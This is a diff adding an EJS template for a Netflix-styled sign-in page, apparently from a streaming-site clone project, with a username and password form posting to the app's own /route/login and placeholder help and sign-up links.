@@ -1,0 +1,23 @@
+<%-include('header')-%>
+
+  <div class="container">
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/08/Netflix_2015_logo.svg/1200px-Netflix_2015_logo.svg.png" alt="Netflix Logo">
+    </div>
+    <form class="form" action="/route/login" method="POST">
+      <input type="text" name="username" placeholder="Email or phone number" required>
+      <input type="password" name="password" placeholder="Password" required>
+      <button type="submit">Sign In</button>
+      <input type="checkbox" id="remember_me">
+      <label for="remember_me" style="color: rgb(69, 69, 69);font-size: 14px;">Remember me</label>
+
+    </form>
+    <div class="forgot">
+      <a href="#">Forgot email or password?</a>
+    </div>
+    <div class="signup">
+      <a href="#">Sign up</a>
+    </div>
+  </div>
+
+<%-include('footer')-%>
